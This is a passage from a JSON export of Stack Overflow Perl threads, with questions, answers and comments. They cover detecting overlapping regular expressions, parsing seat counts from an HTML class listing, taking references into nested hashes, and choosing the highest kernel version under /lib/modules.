way.  (I don't know how difficult reversing is.)</li>\n<li>If you can say that a particular character must be at any position, then use it as a discriminator:  <code>^a.b.*c$</code> -- <code>a</code> in pos 1; <code>b</code> in pos 3; <code>c</code> at end.  Perhaps this can be extended to character classes:  <code>^\\w</code> may match, but <code>^\\d</code> and <code>^a.*\\d$</code> can't.</li>\n</ul>\n"}], "owner": {"reputation": 83, "user_id": 6037037, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/h9D96.jpg?s=128&g=1", "display_name": "Scott", "link": "https://stackoverflow.com/users/6037037/scott"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 104, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1570911666, "creation_date": 1569987868, "last_edit_date": 1570080605, "question_id": 58194936, "link": "https://stackoverflow.com/questions/58194936/how-can-i-determine-which-regular-expressions-from-a-list-possibly-overlap", "title": "How can I determine which regular expressions from a list possibly overlap", "body": "<p>I have a table of regular expressions that are in an MySQL table that I match text against.</p>\n\n<p>Is there a way, using MySQL or any other language (preferably Perl) that I can take this list of expressions and determine which of them MAY overlap.  This should be independent of whatever text may be supplied to the expressions.</p>\n\n<p>All of the expression have anchors.</p>\n\n<p>Here is an example of what I am trying to get:</p>\n\n<p>Expressions:</p>\n\n<pre><code>^a$\n^b$\n^ab\n^b.*c\n^batch\n^catch\n</code></pre>\n\n<p>Result:\n<code>'^b.*c' and '^batch' MAY overlap</code></p>\n\n<p>Thoughts?</p>\n\n<p>Thanks,\nScott</p>\n\n<p>Further explanation:</p>\n\n<p>I have a list of user-created regexes and an imported list of strings that are to be matched against the regexes.  In this case the strings are \"clean\" data (ie they are not user-created but imported from another source - they must not change).</p>\n\n<p>When a user adds to the list of regexes I do not want any collisions on either the existing list of strings nor any future strings (which can not be guessed ahead of time - the only constraints being they are ASCII printable characters no longer than 255 characters).</p>\n\n<p>A brute-force method would be to create a \"rainbow\" table of all of the permutations of strings and each time a regex is added run all of the regexes against the rainbow table.  However I'd like to avoid this (I'm not even sure of the cost) and so was wondering aloud as to the possibility of an algorithm that would AT LEAST show which regexes in a list MAY collide.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 4969, "user_id": 10971581, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XPQr1.png?s=128&g=1", "display_name": "jhnc", "link": "https://stackoverflow.com/users/10971581/jhnc"}, "edited": false, "score": 5, "creation_date": 1569979241, "post_id": 58194057, "comment_id": 102767151, "body": "You have two <code>print</code> statements. <code>print</code> doesn&#39;t output a newline unless you tell it to do so."}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1569995787, "post_id": 58194057, "comment_id": 102770202, "body": "If you want to automatically print a newline, use <a href=\"https://perldoc.pl/perlfunc#say-FILEHANDLE-LIST\" rel=\"nofollow noreferrer\">say</a> instead."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 12084159, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mB02gu0RRhQ3lOSmwepL2bArk2fTmOX1PNRAxjjzg=k-s128", "display_name": "Nicholas Furusho", "link": "https://stackoverflow.com/users/12084159/nicholas-furusho"}, "edited": false, "score": 0, "creation_date": 1570141589, "post_id": 58198395, "comment_id": 102830115, "body": "Thank you for your input on my code, I&#39;m taking a look and revising it accordingly right now. But for this assignment I have to use what we&#39;ve learned in class and unfortunately we haven&#39;t gotten around to using Web::Query"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 11, "user_id": 12084159, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mB02gu0RRhQ3lOSmwepL2bArk2fTmOX1PNRAxjjzg=k-s128", "display_name": "Nicholas Furusho", "link": "https://stackoverflow.com/users/12084159/nicholas-furusho"}, "edited": false, "score": 0, "creation_date": 1570206839, "post_id": 58198395, "comment_id": 102852721, "body": "@NicholasFurusho: I don&#39;t know what you&#39;ve covered in class, but parsing that data out of your HTML using regexes is going to be a really hard job. I wouldn&#39;t want to take it on."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 1, "last_activity_date": 1570014432, "last_edit_date": 1570014432, "creation_date": 1570006923, "answer_id": 58198395, "question_id": 58194057, "link": "https://stackoverflow.com/questions/58194057/program-argument-is-100-but-returns-the-value-as-0100/58198395#58198395", "title": "Program argument is 100 but returns the value as 0100", "body": "<p>You're getting \"0100\" because you have two <code>print()</code> statements.</p>\n\n<pre><code>print $sum;\n...\nprint $courseNum;\n</code></pre>\n\n<p>And because there are no newlines or other output between them, you get the two values printed out next to each other. <code>$sum</code> is '0' and <code>$courseNum</code> is '100'.</p>\n\n<p>So why is <code>$sum</code> zero? Well, that's because your regex isn't picking up the data you want it to match. Your regex looks like this:</p>\n\n<pre><code>m/$courseNum(.+?)align=\"center\"&gt;(\\d)&lt;/\n</code></pre>\n\n<p>You're looking for <code>$courseNum</code> followed by a number of other characters, followed by 'align=\"center\">' and then your digit. This doesn't work for a number of reasons.</p>\n\n<ol>\n<li>The string \"100\" appears many times in your text. Many times it doesn't even mean a course number (e.g. \"100%\"). Perhaps you should look for something more precise (<code>ICS $coursenum</code>).</li>\n<li>The <code>.+?</code> doesn't do what you think it does. The dot doesn't match newline characters unless you use the <code>/s</code> option on the match operator.</li>\n<li>But even if you fix those first two problems, it still won't work as there are a number of numeric table cells for each course and you're doing nothing to ensure that you're grabbing the last one. Your current code will get the \"Curr. Enrolled\" column, not the \"Seats Avail\" one.</li>\n</ol>\n\n<p>This is a non-trivial HTML parsing problem. It shouldn't be addressed using regexes (HTML should never be parsed using regexes). You should look at one of the HTML parsing modules from CPAN - I think I'd use <a href=\"https://metacpan.org/pod/Web::Query\" rel=\"nofollow noreferrer\">Web::Query</a>.</p>\n\n<p><strong>Update:</strong> An example solution using Web::Query:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse feature 'say';\n\nuse File::Basename;\nuse Web::Query;\n\nmy $course_num = shift\n  or die 'Usage: perl ' . basename $0 . \" course_number\\n\";\n\nmy $source = 'fa19_ics_class_availability.html';\nopen my $fh, '&lt;', $source\n  or die \"Cannot open '$source': $!\\n\";\n\nmy $html = do { local $/; &lt;$fh&gt; };\n\nmy $count_free;\n\nwq($html)\n  # Get each table row in the table\n  -&gt;find('table.listOfClasses tr')\n  -&gt;each(sub {\n      my ($i, $elem) = @_;\n\n      my @tds;\n\n      # Get each &lt;td&gt; in the &lt;tr&gt;\n      $elem-&gt;find('td')-&gt;each(sub { push @tds, $_[1] });\n\n      # Ignore rows that don't have 13 columns\n      return if @tds != 13;\n      # Ignore rows that aren't about the right course\n      return if $tds[2]-&gt;text ne \"ICS $course_num\";\n\n      # Add the number of available places\n      $count_free += $tds[8]-&gt;text;\n    });\n\n say $count_free;\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 12084159, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mB02gu0RRhQ3lOSmwepL2bArk2fTmOX1PNRAxjjzg=k-s128", "display_name": "Nicholas Furusho", "link": "https://stackoverflow.com/users/12084159/nicholas-furusho"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1570014432, "creation_date": 1569978839, "last_edit_date": 1570005716, "question_id": 58194057, "link": "https://stackoverflow.com/questions/58194057/program-argument-is-100-but-returns-the-value-as-0100", "title": "Program argument is 100 but returns the value as 0100", "body": "<p>Right now I am trying to do an assignment where I have to\n- Extract information from an HTML file\n- Save it to a scalar \n- Run a regular expression to find the number of seats available in the designated course (the program argument is the course number for example 100 for ICS 100)\n- If the course has multiple sessions, I have to find the sum of the seats available and print\n- The output is just the number of seats available</p>\n\n<p>The problem here is that when I was debugging and checking to make sure that my variable I have the program arg saved to was storing the correct value, it was storing the values with an extra 0 behind it. </p>\n\n<blockquote>\n  <p>ex.) perl filename.pl 100</p>\n  \n  <blockquote>\n    <p>ARGV[0] returns as 0100</p>\n  </blockquote>\n</blockquote>\n\n<p>I've tried storing the True regular expression values to an array, saving using multiple scalar variables, and changing my regular expression but none worked.</p>\n\n<pre><code>die \"Usage: perl NameHere_seats.pl course_number\" if (@ARGV &lt; 1);\n# This variable will store the .html file contents\nmy $fileContents;\n# This variable will store the sum of seats available in the array @seatAvailable\nmy $sum = 0;\n# This variable will store the program argument\nmy $courseNum = $ARGV[0];\n\n# Open the file to read contents all at once\nopen (my $fh, \"&lt;\", \"fa19_ics_class_availability.html\") or die (\"Couldn't open 'fa19_ics_class_availability.html'\\n\");\n  # use naked brakets to limit the $/\n  {\n  #use local $/ to get &lt;$fh&gt; to read the whole file, and not one line\n  local $/;\n  $fileContents = &lt;$fh&gt;;\n  }\n# Close the file handle\nclose $fh;\n# Uncomment the line below to check if you've successfully extracted the text\n# print $fileContents;\n# Check if the course exists\ndie \"No courses matched...\\n\" if ($ARGV[0] !~ m/\\b(1[0-9]{2}[A-Z]?|2[0-8][0-9][A-Z]?|29[0-3])[A-Z]?\\b/);\nwhile ($fileContents =~ m/$courseNum(.+?)align=\"center\"&gt;(\\d)&lt;/) {\n  my $num = $2;\n  $sum = $sum + $num;\n}\nprint $sum;\n# Use this line as error checking to make sure @ARGV[0] is storing proper number\nprint $courseNum;\n</code></pre>\n\n<p>The current output I am receiving when program argument is 100 is just 0, and I assume it's because the regular expression is not catching any values as true therefore the sum remains at a value of 0. The output should be 15... \nThis is a link to the .html page > <a href=\"https://laulima.hawaii.edu/access/content/user/emeyer/ics/215/FA19/01/perl/fa19_ics_class_availability.html\" rel=\"nofollow noreferrer\">https://laulima.hawaii.edu/access/content/user/emeyer/ics/215/FA19/01/perl/fa19_ics_class_availability.html</a></p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569936732, "post_id": 58185464, "comment_id": 102751491, "body": "What do you mean? <code>$dynamic_c</code> is used as a key"}, {"owner": {"reputation": 8016, "user_id": 196241, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/9b0541fbc7bb5d5bd29aa59c96315c37?s=128&d=identicon&r=PG", "display_name": "w.k", "link": "https://stackoverflow.com/users/196241/w-k"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569936849, "post_id": 58185464, "comment_id": 102751559, "body": "@ikegami Of course, made correction"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569936888, "post_id": 58185464, "comment_id": 102751579, "body": "Adding a grammar error doesn&#39;t help :( And it still asks how to treat <code>$dyanmic_c</code> as a key (which you&#39;re already doing)."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1569937056, "post_id": 58185464, "comment_id": 102751688, "body": "Are you searching for <a href=\"http://p3rl.org/Data::Diver\" rel=\"nofollow noreferrer\">Data::Diver</a>?"}, {"owner": {"reputation": 8016, "user_id": 196241, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/9b0541fbc7bb5d5bd29aa59c96315c37?s=128&d=identicon&r=PG", "display_name": "w.k", "link": "https://stackoverflow.com/users/196241/w-k"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1569937522, "post_id": 58185464, "comment_id": 102751963, "body": "@choroba I want to make temporary meaningful references for deep data structures for better operability. I make them with 2 lines. For curiosity I wanted to know, is it possible to make them in one step?"}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569938228, "post_id": 58186178, "comment_id": 102752417, "body": "Delete the irrelevant part. Added an explanation. Added an alternative solution (the first one)."}, {"owner": {"reputation": 8016, "user_id": 196241, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/9b0541fbc7bb5d5bd29aa59c96315c37?s=128&d=identicon&r=PG", "display_name": "w.k", "link": "https://stackoverflow.com/users/196241/w-k"}, "edited": false, "score": 1, "creation_date": 1569938386, "post_id": 58186178, "comment_id": 102752515, "body": "This is the syntax I was looking for, thank you! Sorry for the poor selection of words. The alternative solution is pretty mind blowing, but logical."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 8016, "user_id": 196241, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/9b0541fbc7bb5d5bd29aa59c96315c37?s=128&d=identicon&r=PG", "display_name": "w.k", "link": "https://stackoverflow.com/users/196241/w-k"}, "edited": false, "score": 0, "creation_date": 1569938524, "post_id": 58186178, "comment_id": 102752597, "body": "Hash elements are just scalars, and references (such as the one returned by <code>{ }</code>) are just scalar values."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 8016, "user_id": 196241, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/9b0541fbc7bb5d5bd29aa59c96315c37?s=128&d=identicon&r=PG", "display_name": "w.k", "link": "https://stackoverflow.com/users/196241/w-k"}, "edited": false, "score": 1, "creation_date": 1569938964, "post_id": 58186178, "comment_id": 102752869, "body": "By the way, that means you could also do  <code>$multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c } = my $hashref = {};</code> :)"}, {"owner": {"reputation": 8016, "user_id": 196241, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/9b0541fbc7bb5d5bd29aa59c96315c37?s=128&d=identicon&r=PG", "display_name": "w.k", "link": "https://stackoverflow.com/users/196241/w-k"}, "edited": false, "score": 0, "creation_date": 1569939043, "post_id": 58186178, "comment_id": 102752917, "body": "Keep coming! ;)"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 4, "last_activity_date": 1569941689, "last_edit_date": 1569941689, "creation_date": 1569937573, "answer_id": 58186178, "question_id": 58185464, "link": "https://stackoverflow.com/questions/58185464/is-there-better-way-to-reference-as-hash/58186178#58186178", "title": "Is there better way to reference as hash?", "body": "<p>If the goal is to reduce code duplication, you could simply change the order in you which you assign things.</p>\n\n<p>For example,</p>\n\n<pre><code>$multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c } = {};\nmy $hashref = $multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c };\n</code></pre>\n\n<p>and</p>\n\n<pre><code>my $hashref = {};\n$multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c } = $hashref;\n</code></pre>\n\n<p>produce the same result.</p>\n\n<p>However, there is an even simpler solution. </p>\n\n<pre><code>$multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c } = {};\nmy $hashref = $multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c };\n</code></pre>\n\n<p>can also be written as</p>\n\n<pre><code>my $hashref = $multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c } = {};\n</code></pre>\n\n<p>Scalar assignment is right-associative, so <code>$a = $b = $c;</code> is equivalent to <code>$a = ( $b = $c );</code>. It returns its left-hand side, so <code>$a = ( $b = $c )</code> is equivalent to <code>$b = $c; $a = $b;</code></p>\n"}], "owner": {"reputation": 8016, "user_id": 196241, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/9b0541fbc7bb5d5bd29aa59c96315c37?s=128&d=identicon&r=PG", "display_name": "w.k", "link": "https://stackoverflow.com/users/196241/w-k"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "accepted_answer_id": 58186178, "answer_count": 1, "score": 1, "last_activity_date": 1569941689, "creation_date": 1569935338, "last_edit_date": 1569937284, "question_id": 58185464, "link": "https://stackoverflow.com/questions/58185464/is-there-better-way-to-reference-as-hash", "title": "Is there better way to reference as hash?", "body": "<p>If I have deep multi-level (dynamic) hash-structure, I try to reference deeper parts through separate variables, something like this:</p>\n\n<pre><code>my $multilevel_dynamic_hash;\nmy $dynamic_a = int( rand() * 100 );\nmy $dynamic_b = int( rand() * 100 );\nmy $dynamic_c = int( rand() * 100 );\n\n$multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c } = {};\nmy $reference_as_hashref = $multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c };\n\ncall_to_some_subroutine( $reference_as_hashref );\n</code></pre>\n\n<p>Now, instead of those two lines</p>\n\n<pre><code>$multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c } = {};\nmy $reference_as_hashref = $multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c };\n</code></pre>\n\n<p>is there possible to avoid the first line and declare <code>$reference_as_hashref</code> so that it treats the last part (<code>$dynamic_c</code>) as key to the next level of hash?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I'd like to take reference, something like this:</p>\n\n<pre><code>my $reference_as_hashref = $multilevel_dynamic_hash-&gt;{ $dynamic_a }{ $dynamic_b }{ $dynamic_c }{};\n</code></pre>\n\n<p>NB! last <code>{}</code></p>\n\n<p>Instead, first I have to tell that the value is hashref and then I can reference it. Is it possible with one step? </p>\n"}, {"tags": ["perl", "sorting", "kernel", "version"], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1569937316, "post_id": 58180400, "comment_id": 102751830, "body": "You&#39;re breaking the module&#39;s license."}, {"owner": {"reputation": 101, "user_id": 3807327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dEEYd.jpg?s=128&g=1", "display_name": "Olivier LAHAYE", "link": "https://stackoverflow.com/users/3807327/olivier-lahaye"}, "edited": false, "score": 0, "creation_date": 1570203371, "post_id": 58180400, "comment_id": 102851387, "body": "I need a packaged version or a simple code that is able to see that:  4.18.0-144.el8.x86_64  &gt;  4.18.0-80.7.1.el8_0.x86_64. All sorting function I4ve seen are seeing -144 as lower than -80 which is wrong in this situation"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 101, "user_id": 3807327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dEEYd.jpg?s=128&g=1", "display_name": "Olivier LAHAYE", "link": "https://stackoverflow.com/users/3807327/olivier-lahaye"}, "edited": false, "score": 0, "creation_date": 1570206944, "post_id": 58180400, "comment_id": 102852763, "body": "@OlivierLAHAYE: The code I&#39;ve shown gets that right. It&#39;s simply a case of recognising you have two numbers and switching to numeric comparisons."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 4, "last_activity_date": 1569919299, "last_edit_date": 1569919299, "creation_date": 1569916754, "answer_id": 58180400, "question_id": 58179853, "link": "https://stackoverflow.com/questions/58179853/how-can-i-list-highest-version-of-a-kernel-in-perl/58180400#58180400", "title": "How can I list highest version of a kernel in perl", "body": "<p>The easiest way to do this would be to use the <a href=\"https://metacpan.org/pod/Sort::Versions\" rel=\"nofollow noreferrer\">Sort::Versions</a> module (which you'd need to install from CPAN).</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse feature 'say';\n\nuse Sort::Versions;\nuse File::Basename;\n\nfor (sort { versioncmp($b, $a) } glob '/lib/modules/*') {\n  my $ver = basename $_;\n  if (-e \"/lib/modules/$ver/vmlinuz\") {\n    say $ver;\n    last;\n  }\n}\n</code></pre>\n\n<p><strong>Update:</strong> Your question includes this:</p>\n\n<blockquote>\n  <p>I've seen that modules for kernel version comparison or version sorting, but none are available as distro package in all release of CentOS ranging from 6 to 8 included</p>\n</blockquote>\n\n<p>Of course, packages aren't the only way to install CPAN modules. You could always use <code>cpan</code> or <code>cpanm</code>. But if you really don't want to install a module that way, then you could also cut and paste the <code>versioncmp()</code> subroutine into your code. It's only a few dozen lines of code.</p>\n\n<pre><code>sub versioncmp ($$) {\n    my @A = ($_[0] =~ /([-.]|\\d+|[^-.\\d]+)/g);\n    my @B = ($_[1] =~ /([-.]|\\d+|[^-.\\d]+)/g);\n\n    my ($A, $B);\n    while (@A and @B) {\n        $A = shift @A;\n        $B = shift @B;\n        if ($A eq '-' and $B eq '-') {\n            next;\n        } elsif ( $A eq '-' ) {\n            return -1;\n        } elsif ( $B eq '-') {\n            return 1;\n        } elsif ($A eq '.' and $B eq '.') {\n            next;\n        } elsif ( $A eq '.' ) {\n            return -1;\n        } elsif ( $B eq '.' ) {\n            return 1;\n        } elsif ($A =~ /^\\d+$/ and $B =~ /^\\d+$/) {\n            if ($A =~ /^0/ || $B =~ /^0/) {\n                return $A cmp $B if $A cmp $B;\n            } else {\n                return $A &lt;=&gt; $B if $A &lt;=&gt; $B;\n            }\n        } else {\n            $A = uc $A;\n            $B = uc $B;\n            return $A cmp $B if $A cmp $B;\n        }       \n    }\n    @A &lt;=&gt; @B;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 1, "creation_date": 1569941044, "post_id": 58186608, "comment_id": 102754286, "body": "Strangely, my <a href=\"https://metacpan.org/pod/Dir::ls\" rel=\"nofollow noreferrer\">Dir::ls</a> module may actually be useful here (it contains an implementation of version sorting based on filevercmp)."}], "tags": [], "owner": {"reputation": 1064, "user_id": 1031776, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/3fed911ae9175eaf6c4e4ec51de7e6ac?s=128&d=identicon&r=PG", "display_name": "Will", "link": "https://stackoverflow.com/users/1031776/will"}, "is_accepted": false, "score": 1, "last_activity_date": 1569938997, "creation_date": 1569938997, "answer_id": 58186608, "question_id": 58179853, "link": "https://stackoverflow.com/questions/58179853/how-can-i-list-highest-version-of-a-kernel-in-perl/58186608#58186608", "title": "How can I list highest version of a kernel in perl", "body": "<p>Is it cheating to use <code>ls</code> within perl?</p>\n\n<pre><code>for (`ls -rv /lib/modules/`){\n  chomp;\n \u00a0next unless -e \"/lib/modules/$_/vmlinuz\";\n  say; \n  last;\n}\n</code></pre>\n"}], "owner": {"reputation": 101, "user_id": 3807327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dEEYd.jpg?s=128&g=1", "display_name": "Olivier LAHAYE", "link": "https://stackoverflow.com/users/3807327/olivier-lahaye"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 119, "favorite_count": 1, "accepted_answer_id": 58180400, "answer_count": 2, "score": 1, "last_activity_date": 1569938997, "creation_date": 1569914483, "question_id": 58179853, "link": "https://stackoverflow.com/questions/58179853/how-can-i-list-highest-version-of-a-kernel-in-perl", "title": "How can I list highest version of a kernel in perl", "body": "<p>In many docker container, le /boot is empty. Though, the vmlinuz is available in /var/lib/modules/&lt;kver&gt;/vmlinuz</p>\n\n<p>In shell, I can do:</p>\n\n<pre><code>for kver in $(ls /lib/modules|sort -Vr)\ndo\n    test -f /lib/modules/$kver/vmlinuz &amp;&amp; echo $kver &amp;&amp; break\ndone\n</code></pre>\n\n<p>How can I do this un perl in a reliable way (I mean: using modules that are present in CentOS-6 to CentOS-8 or any other Linux distro.</p>\n\n<p>I've seen that modules for kernel version comparison or version sorting, but none are available as distro package in all release of CentOS ranging from 6 to 8 included (8 is important as it s a clone of RHEL-8 and RHEL-8 is extremely stripped down distro regarding perl packages).</p>\n\n<p>If I have those 2 versions: 4.18.0-144.el8.x86_64  4.18.0-80.7.1.el8_0.x86_64 I need to chose the -144 one.</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 5, "creation_date": 1569867583, "post_id": 58173119, "comment_id": 102727294, "body": "Re &quot;<i>Bad Idea</i>&quot;, See <a href=\"https://perl.plover.com/varvarname.html\" rel=\"nofollow noreferrer\">Why it&#39;s stupid to `use a variable as a variable name&#39;</a> and <a href=\"https://perl.plover.com/varvarname2.html\" rel=\"nofollow noreferrer\">A More Direct Explanation of the Problem</a>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1569867681, "post_id": 58173119, "comment_id": 102727335, "body": "Tip: Best to start at zero, since array indexes start at zero."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1569867743, "post_id": 58173119, "comment_id": 102727365, "body": "Tip: Best to avoid C-style for loops in favour of much simpler foreach loops."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1569867855, "post_id": 58173119, "comment_id": 102727417, "body": "So, <code>my @buttons = ( 0, 123, 0, 0 ); for my $i (0..$#buttons) { if ($buttons[$i]) { ... } }</code>, or even <code>my @buttons = ( 0, 123, 0, 0 ); for my $button (@buttons) { if ($button) { ... } }</code>"}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, 